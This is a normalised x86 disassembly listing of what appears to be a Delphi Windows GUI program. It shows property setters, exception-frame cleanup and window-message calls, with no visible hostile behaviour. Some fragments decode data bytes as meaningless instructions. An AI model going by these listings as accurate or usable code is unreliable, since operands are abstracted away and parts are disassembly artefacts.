call [ ebx + 0x8 ]
sub_448e65
jmp sub_4038ec
sub_448e6c
pop ebp
retn
sub_448e70
sub [ rw-data ] 0x1
retn
sub_448ead
xor eax [ eax ]
hlt
sub_4492bc
clc
push edx
push ecx
[ ebp + ecx * 8 - 0x3863ffbc ]
inc esp
add [ eax + ecx * 8 + 0x44 ] ch
add [ eax + ecx * 8 - 0x32f3ffbc ] ah
inc esp
add al bh
int3
sub_449d45
xor eax [ eax ]
hlt
sub_449dd8
mov eax [ esp + 0x8 ]
retn
sub_449de0
push ebx
mov ebx eax
call sub_449dd8
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
jmp sub_403924
sub_449dfc
pop ebx
retn
sub_44a075
jmp sub_4038ec
sub_44a07c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a1c7
jmp sub_4038ec
sub_44a1ce
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a1e4
push ebx
mov eax [ rw-data ]
call sub_4145b0
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41456c
mov eax ebx
pop ebx
retn
sub_44a36c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403348
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44a388
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44aa83
jmp sub_4038ec
sub_44aa8a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ab82
jmp sub_4038ec
sub_44ab89
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44afac
jmp sub_4038ec
sub_44afb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44b45f
jmp sub_4038ec
sub_44b900
jmp sub_4038ec
sub_44b907
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44bd6b
jmp sub_4038ec
sub_44c228
jmp sub_4038ec
sub_44c22f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c5da
jmp sub_4038ec
sub_44c5e1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44c5ef
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c79c
mov eax [ r-xdata ]
retn
sub_44c7d8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c7ec
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c7fc
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c80c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_44cb08
mov edx eax
sub_44c8a4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403348
mov edx esi
call sub_44c824
pop esi
pop ebx
retn
sub_44c920
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44cb08
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4140f4
mov ecx eax
sub_44ccf8
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_44cd60
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_44d108
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_44d13c
sub_44d13c
mov edx sub_44d114
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44a264
retn
sub_44d326
jmp sub_4038ec
sub_44d32d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d7c4
jmp sub_4038ec
sub_44d803
jmp sub_4038ec
sub_44d80a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d9a8
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44dae4
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403394
pop esi
pop ebp
retn 0x8
sub_44db00
mov eax [ eax + 0x34 ]
call sub_44ad38
retn
sub_44db0c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403394
pop esi
retn
sub_44db48
push ebx
mov ecx sub_44db20
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44a264
pop ebx
retn
sub_44dd7c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44dd90
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_403638#8
jmp sub_403638
sub_44dfc7
jmp sub_4038ec
sub_44dff2
jmp sub_4038ec
sub_44dff9
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44e010
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_44e1f8
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_44db48
sub_44e278
jmp sub_4038ec
sub_44e2bc
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44e2d4
push ebx
mov ebx eax
mov eax ebx
call sub_419ea0
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_44e326
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_44db48
sub_44e39c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44e4e5
jmp sub_4038ec
sub_44e4ec
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44e72c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_44e73c
sub_44e790
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_44e7a0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_44e7b0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_44e7c0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_44e7d0
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_44e848
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44ab90
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44ab90
retn
sub_44e864
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44ab90
sub_44e8ac
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_44db00
retn
mov eax edx
retn
sub_44e8e6
jmp sub_403638
sub_44e8eb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a544
call sub_4039a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ec51
jmp sub_4038ec
sub_44ec58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403198
retn
sub_44ec6e
jmp sub_4038ec
sub_44ed6f
jmp sub_4038ec
sub_44ed76
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ed93
mov eax [ ebp - 0x14 ]
call sub_403198
retn
sub_44ed8c
jmp sub_4038ec
sub_44edb1
jmp sub_4038ec
sub_44ee3b
jmp sub_4038ec
sub_44ee42
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ee74
push ebx
mov ebx eax
mov eax ebx
call sub_4141dc
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41ac50
sub_44ef38
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_44ef4c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_44ef54
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_44f319
jmp sub_4038ec
sub_44f320
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f420
jmp sub_4038ec
sub_44f427
pop ebp
retn
sub_451085
xor eax [ eax ]
hlt
sub_451268
mov eax [ rw-data ]
retn
sub_451270
mov [ rw-data ] eax
retn
j_sub_403638#7
jmp sub_403638
sub_4513ef
jmp sub_4038ec
sub_4513f6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4516fe
jmp sub_4038ec
sub_451705
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4517a9
jmp sub_4038ec
sub_4517b0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451840
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_451f6c
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_452618
sub_451f88
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_451f6c
sub_4520a8
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_452618
sub_4520c0
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_452618
sub_4520d8
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_452618
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_452104
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_452110
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_452618
retn
sub_4523f0
push ebx
mov ebx edx
mov edx ebx
call sub_43dbe4
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_452460
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_452588
jmp sub_4038ec
sub_45258f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452598
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4519a4
mov eax [ ebx + 0x20c ]
call sub_4519a4
sub_4525f8
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_452608
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_452703
jmp sub_4038ec
sub_452710
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_452728
sub_452944
retn
sub_4529b2
jmp sub_4038ec
sub_4529f1
jmp sub_4038ec
sub_452a24
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43f0dc
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_451c30
retn
sub_452a48
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43f0fc
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_451c30
retn
sub_452b3d
jmp sub_4038ec
sub_452b44
mov eax [ ebp - 0x4 ]
call sub_44105c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_451898
mov eax [ ebp - 0x4 ]
call sub_452618
sub_452c78
jmp sub_4038ec
sub_452cb0
jmp sub_4038ec
sub_452cb7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452cd7
lea eax [ ebp - 0x114 ]
call sub_403ee8
retn
sub_452cd0
jmp sub_4038ec
sub_452cd7
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_452fde
jmp sub_4038ec
sub_452fe5
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40350c
sub_453039
jmp sub_403638
sub_4530b5
jmp sub_403638
sub_4530ba
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45a544
call sub_4039a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453472
jmp sub_4038ec
sub_453479
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453554
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417e30
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_45356c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4535a4
mov edx eax
mov eax esi
call sub_4196b8
pop esi
pop ebx
retn
sub_453588
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454948
mov edx eax
mov eax esi
call sub_4196b8
pop esi
pop ebx
retn
sub_4535a4
push ebx
mov ebx eax
mov eax ebx
call sub_4545e8
mov edx r-xdata
call sub_41dbdc
pop ebx
retn
sub_4536a8
push ebx
mov ebx eax
mov eax ebx
call sub_4536b8
xor al 0x1
pop ebx
retn
sub_4536b8
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_453714
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_453734
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_453754
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_453a4d
jmp sub_4038ec
sub_453a54
pop ecx
pop ebp
retn
sub_453a58
xor eax eax
retn
sub_453d30
jmp sub_4038ec
sub_453d37
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub_453d4d
jmp sub_4038ec
sub_453e37
jmp sub_4038ec
sub_453e3e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453e5b
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub_453e54
jmp sub_4038ec
sub_453e7b
jmp sub_4038ec
sub_454166
jmp sub_4038ec
sub_4542f9
jmp sub_4038ec
sub_4545e8
mov eax [ eax + 0x238 ]
retn
sub_4545f0
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4545fc
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45493a
jmp sub_4038ec
sub_454941
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454948
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_454990
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_43e2f8
sub_4549ac
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_4549e8
push ebx
mov ebx eax
mov eax ebx
call sub_44028c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41d618
sub_454a6c
push ebx
mov ebx eax
mov eax ebx
call sub_4402b4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41dc80
sub_454a8c
push ebx
mov ebx eax
mov eax ebx
call sub_4546ac
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_454774
pop ebx
retn
sub_4552b9
lea eax [ ebp - 0xb4 ]
call sub_403ee8
retn
sub_4552c5
jmp sub_4038ec
j_sub_4552b9
jmp sub_4552b9
sub_4552cc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455424
jmp sub_4038ec
sub_45542b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455710
jmp sub_4038ec
sub_455717
mov eax [ rw-data ]
call sub_457fc8
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45572e
add [ eax ] al
retn
sub_45598c
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_4559ac
mov eax [ eax + 0x240 ]
call sub_42395c
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_459df8
sub_455a53
jmp sub_4038ec
sub_455a5a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455a7d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41dc58
retn
sub_455a76
jmp sub_4038ec
sub_455a7d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455c3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4559ac
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_455ea4
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_44dcb4
sub_455f8f
jmp sub_4038ec
sub_455f96
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455f9c
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_455784
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_455ff4
call sub_456d1c
retn
sub_456441
jmp sub_4038ec
sub_456448
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456744
jmp sub_403638
j_sub_403638#6
jmp sub_403638
sub_456bd9
jmp sub_4038ec
sub_456be0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456bfd
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_456bf6
jmp sub_4038ec
sub_456bfd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456c04
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_42395c
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45364c
sub_456c24
call sub_403198
retn
sub_456c7c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_456ce2
jmp sub_4038ec
j_sub_403638#5
jmp sub_403638
sub_456ebc
xor edx edx
call sub_4539b0
retn
sub_456ec4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4539b0
mov eax ebx
call sub_43a7d0
pop ebx
retn
sub_456f4a
jmp sub_4038ec
sub_456f51
pop ebx
pop ecx
pop ebp
retn
sub_456f58
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_440d58
push eax
call PostMessageA
pop ebx
retn
sub_45715c
jmp sub_4038ec
sub_4571fd
jmp sub_4038ec
sub_457207
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457226
mov eax [ rw-data ]
call sub_4594d0
retn
sub_45721f
jmp sub_4038ec
sub_457226
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457243
lea eax [ ebp - 0x20 ]
call sub_403ee8
retn
sub_45723c
jmp sub_4038ec
sub_457243
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457324
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43997c
retn
mov edx eax
mov eax [ rw-data ]
call sub_458b24
retn
sub_4576a8
mov edx eax
mov eax [ rw-data ]
call sub_45a544
mov al 0x1
retn
sub_457790
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_4576b8
sub_4577a4
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_4576b8
sub_4577b8
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_4576b8
sub_4577cc
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_4576b8
sub_4577e0
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45794b
jmp sub_4038ec
sub_457952
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457958
push ebx
mov ebx eax
mov eax ebx
call sub_43f670
mov eax ebx
call sub_43f7f4
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_456f58
sub_457bce
jmp sub_4038ec
sub_457bd5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457bdc
push ebx
mov ebx edx
mov edx ebx
call sub_43fad8
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_439a84
pop ebx
retn
sub_457c30
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_457c98
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_457c48
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_457c98
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_457c64
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_457c98
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_457c7c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_457c98
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_457f18
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457f24
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457f30
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457f3c
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457f48
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457f54
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457f60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_414098
pop esi
pop ebx
retn
sub_457f74
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457f90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414098
pop esi
pop ebx
retn
sub_457fa4
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_457fac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414098
pop esi
pop ebx
retn
sub_457fc0
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45809c
mov eax [ eax + 0x54 ]
call sub_413eec
retn
sub_4580a8
mov eax [ eax + 0x54 ]
call sub_4141dc
retn
sub_458343
jmp sub_4038ec
sub_458387
jmp sub_4038ec
sub_45838e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4583dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4581dc
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403f3c
pop esi
pop ebx
retn
sub_458448
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_414098
pop esi
pop ebx
retn
sub_45845c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_4586a9
jmp sub_4038ec
sub_4586b0
pop ebx
mov esp ebp
pop ebp
retn
sub_4586b8
inc [ eax + 0x8c ]
retn
sub_4586c0
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_4586e0
sub_4586e0
xor edx edx
call sub_458b24
retn
sub_458b16
jmp sub_4038ec
sub_458b9d
jmp sub_4038ec
sub_458bac
add eax 0x30
call sub_40d3ac
retn
sub_458bf0
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_403638#4
jmp sub_403638
sub_458c46
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45a544
call sub_4039a0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_459315
jmp sub_4038ec
sub_45931c
pop ebx
mov esp ebp
pop ebp
retn
sub_4594a4
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4594d0
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4594fc
xor edx edx
call sub_4593f4
retn
sub_459504
mov dl 0x1
call sub_4593f4
retn
sub_459578
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_459590
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45965d
jmp sub_4038ec
sub_459664
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403638#3
jmp sub_403638
sub_45a3ac
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_403638#2
jmp sub_403638
j_sub_403638
jmp sub_403638
sub_45a522
jmp sub_4038ec
sub_45a529
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a530
call sub_40cefc
test al al
je r-xdata
